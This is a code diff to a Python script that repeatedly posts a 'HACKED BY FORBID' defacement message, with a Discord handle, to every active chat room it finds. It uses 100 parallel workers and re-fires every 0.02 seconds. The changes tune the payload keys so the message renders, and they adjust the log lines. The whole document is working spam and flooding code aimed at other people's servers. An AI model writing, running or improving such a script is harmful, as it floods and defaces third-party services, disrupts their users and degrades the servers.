@@ -8,16 +8,17 @@ headers = {
     "Content-Type": "application/json"
 }
 
-print("[FORBID] Max-Speed Broadcaster Engaged...")
+print("[FORBID] Label-Fix Broadcaster Engaged...")
 
 session = requests.Session()
 
 def blast_room(room_url):
     try:
-        # Clean, direct payload designed to render instantly without breaking layout
+        # Including multiple common key variants so the Lua script grabs the text correctly
         payload = {
             "Sender": "FORBID",
             "Message": "HACKED BY FORBID | DISCORD: forbiddenway",
+            "Text": "HACKED BY FORBID | DISCORD: forbiddenway",
             "Timestamp": int(time.time() * 1000),
             "Aura": "voidWings",
             "Color": "red"
@@ -40,13 +41,11 @@ while True:
                 ]
                 
                 if room_urls:
-                    # Maximized worker pool to hammer every room simultaneously
                     with ThreadPoolExecutor(max_workers=100) as executor:
                         executor.map(blast_room, room_urls)
-                    print(f"[FORBID] Spam wave delivered to {len(room_urls)} active servers!")
+                    print(f"[FORBID] Clean spam wave delivered to {len(room_urls)} rooms!")
                     
     except Exception as e:
         print(f"[FORBID] Loop error: {e}")
         
-    # Instant re-fire
     time.sleep(0.02)
